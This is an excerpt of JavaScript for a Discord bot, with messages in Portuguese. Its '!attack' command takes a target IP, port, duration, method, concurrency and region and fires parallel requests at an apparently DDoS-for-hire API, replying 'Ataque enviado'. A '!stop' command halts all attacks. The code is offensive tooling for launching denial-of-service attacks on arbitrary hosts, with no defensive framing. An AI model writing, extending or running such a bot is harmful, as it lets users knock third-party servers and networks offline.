...
async function sendApiRequest(ip, port, time, method, concurrents, geo) {
    ...
    const requests = Array(concurrents).fill(url).map(u => axios.get(u));
...
async function stopAttack() {
    ...
    try {
        await axios.get(url);
        console.log(`Todos os ataques foram parados.`);
    } catch (error) {
        console.error('Erro ao parar ataques:', error.message);
    }
}
...
client.on('messageCreate', async (message) => {
    ...
    if (message.content.startsWith('!attack')) {
        ...
        const [ip, port, time, method, concurrents, geo] = args;

        if (!ip || !port || !time || !method || !concurrents) {
            return message.reply('Por favor, forneça todos os parâmetros necessários: !attack <ip> <port> <time> <method> <concurrents> [geo]');
        }

        await sendApiRequest(ip, port, time, method, parseInt(concurrents), geo);
        message.reply(`Ataque enviado para o IP: ${ip}`);
    }

    if (message.content === '!stop') {
        await stopAttack();
        message.reply('Todos os ataques foram parados.');
    }
});
